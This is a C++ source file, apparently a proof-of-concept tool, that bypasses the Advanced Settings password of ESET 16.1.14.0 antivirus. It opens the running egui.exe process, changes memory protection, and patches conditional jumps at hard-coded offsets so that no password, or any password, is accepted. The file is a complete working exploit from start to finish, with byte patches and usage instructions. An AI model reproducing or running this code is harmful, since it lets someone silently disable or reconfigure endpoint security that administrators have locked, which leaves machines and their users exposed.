/********************
*
* eESET
* ESET 16.1.14.0 Advanced Settings password bypass
* Currently only works when "self-defense" mode has been turned off
*
********************/

#include <iostream>
#include <Windows.h>
#include <TlHelp32.h>

// Process data
struct proc_t
{
    DWORD pid;
    HANDLE handle;
};

// Get PID for process by .exe name
DWORD get_pid(LPCWSTR exe_name)
{
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (snap == INVALID_HANDLE_VALUE)
        return 0;

    PROCESSENTRY32W proc;
    proc.dwSize = sizeof(proc);
    size_t name_len = wcslen(exe_name);

    while (Process32Next(snap, &proc))
        if (!_wcsnicmp(proc.szExeFile, exe_name, name_len))
        {
            CloseHandle(snap);
            return proc.th32ProcessID;
        }

    CloseHandle(snap);
    return 0;
}

// Get base address of a process module
uintptr_t get_modbase(DWORD pid, LPCWSTR mod_name)
{
    if (!mod_name)
        return 0;

    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pid);

    if (snap == INVALID_HANDLE_VALUE)
        return 0;

    MODULEENTRY32 mod;
    mod.dwSize = sizeof(MODULEENTRY32);
    size_t name_len = wcslen(mod_name);

    if (!Module32First(snap, &mod))
        return 0;

    do
    {
        if (!_wcsnicmp(mod.szModule, mod_name, name_len))
        {
            CloseHandle(snap);
            return (uintptr_t)mod.modBaseAddr;
        }
    } while (Module32Next(snap, &mod));

    CloseHandle(snap);
    return 0;
}

// Open process by name
bool proc_open(proc_t& proc_info, LPCWSTR proc_name)
{
    if (!proc_name)
        return false;

    DWORD pid = get_pid(proc_name);

    if (!pid)
        return false;

    HANDLE handle = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, pid);

    if (!handle)  // INVALID_HANDLE_VALUE not cool enough for this part of the API
        return false;

    proc_info.pid = pid;
    proc_info.handle = handle;

    return true;
}

// Close process
bool proc_close(proc_t& proc_info)
{
    if (!CloseHandle(proc_info.handle))
        return false;

    proc_info.pid = 0;
    proc_info.handle = 0;

    return true;
}

int err_close(proc_t& proc, LPCSTR e)
{
    std::cerr << e << "-- GetLastError(): " << GetLastError() << '\n';
    CloseHandle(proc.handle);
    return -1;
}

int verify_and_patch(uintptr_t RVA, size_t size, LPCSTR orig_bytes, LPCSTR new_bytes)
{
    proc_t proc{ 0 };

    std::cout << "Opening process..." << std::endl;

    if (!proc_open(proc, L"egui.exe"))
        return err_close(proc, "Couldn't open egui.exe process");

    uintptr_t base = get_modbase(proc.pid, L"egui.exe");
    uintptr_t patch_addr = base + RVA;

    std::cout << "Patch address: " << std::hex << patch_addr << std::endl;
    std::cout << "Verifying bytes to patch..." << std::endl;

    char* remote_bytes = new char[size];

    if (!ReadProcessMemory(proc.handle, (void*)patch_addr, remote_bytes, size, NULL))
    {
        delete[] remote_bytes;
        return err_close(proc, "Unable to read original bytes from process");
    }

    if (memcmp(remote_bytes, orig_bytes, size))
    {
        delete[] remote_bytes;
        return err_close(proc, "Unexpected remote bytes (already patched?)\n"
            "This patch designed for ESET 16.1.14.0");
    }

    delete[] remote_bytes;

    std::cout << "Patching..." << std::endl;

    DWORD access_old, access_ignored;

    if (!VirtualProtectEx(proc.handle, (void*)patch_addr, size, PAGE_EXECUTE_READWRITE, &access_old))
        return err_close(proc, "Unable to make remote memory writable");

    if (!WriteProcessMemory(proc.handle, (void*)patch_addr, new_bytes, size, NULL))
        return err_close(proc, "Unable to write new bytes to process");

    VirtualProtectEx(proc.handle, (void*)patch_addr, size, access_old, &access_ignored);

    std::cout << "Patch successful\n" << std::endl;

    CloseHandle(proc.handle);
    return 0;
}

int main(int argc, char* argv[])
{
    std::cout << "\nrESET -- ESET 16.1.14.0 Advanced Settings password bypass\n\n"
        "Make sure egui.exe is running before using this program\n"
        "Try running this as Administrator if there are issues\n\n"
        "Bypass persists only while current process is open,\n"
        "but settings changes are permanent\n"
        "Patch details will likely have to be altered for other versions\n" << std::endl;

    size_t mode;

    if ((argc < 2) || (mode = atoi(argv[1])) > 1)
    {
        std::cout << "rESET.exe <mode>\n"
            "0 - No password\n"
            "1 - Any password\n";

        return -1;
    }

    switch (mode)
    {
    case 0:
        std::cout << "0 - No password\n\n";

        return verify_and_patch(0x1D9598,                    // RVA
            6,                           // Patch size
            "\x0F\x84\x40\x01\x00\x00",  // jz  $+0x146;       -- original instruction
            "\xe9\x41\x01\x00\x00\x90"); // jmp $+0x146; nop; -- new instructions

    case 1:
        std::cout << "1 - Any password\n\n";

        return verify_and_patch(0x250084,      // RVA
            2,             // Patch size
            "\x74\x2A",    // jz +0x2c;   -- original instruction
            "\x90\x90");   // nop; nop;   -- new instructions
    }

    return 0;
}
